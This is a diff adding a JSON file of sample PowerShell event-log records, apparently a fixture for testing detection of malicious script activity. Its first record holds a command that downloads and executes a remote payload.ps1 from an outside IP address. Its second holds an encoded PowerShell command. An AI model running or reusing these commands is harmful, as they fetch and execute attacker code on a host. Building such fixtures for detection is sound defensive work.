@@ -1,0 +1,25 @@
+{
+  "events": [
+    {
+      "EventID": 4104,
+      "TimeCreated": "2026-08-12T11:22:00Z",
+      "User": "CORP\\Administrator",
+      "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')",
+      "ScriptBlockId": "SB-1001"
+    },
+    {
+      "EventID": 4104,
+      "TimeCreated": "2026-08-12T11:22:10Z",
+      "User": "CORP\\Administrator",
+      "ScriptBlockText": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+      "ScriptBlockId": "SB-1002"
+    },
+    {
+      "EventID": 4103,
+      "TimeCreated": "2026-08-12T11:22:20Z",
+      "User": "CORP\\Administrator",
+      "ModuleName": "Microsoft.PowerShell.Utility",
+      "Pipeline": "Get-ChildItem -Path C:\\Users"
+    }
+  ]
+}
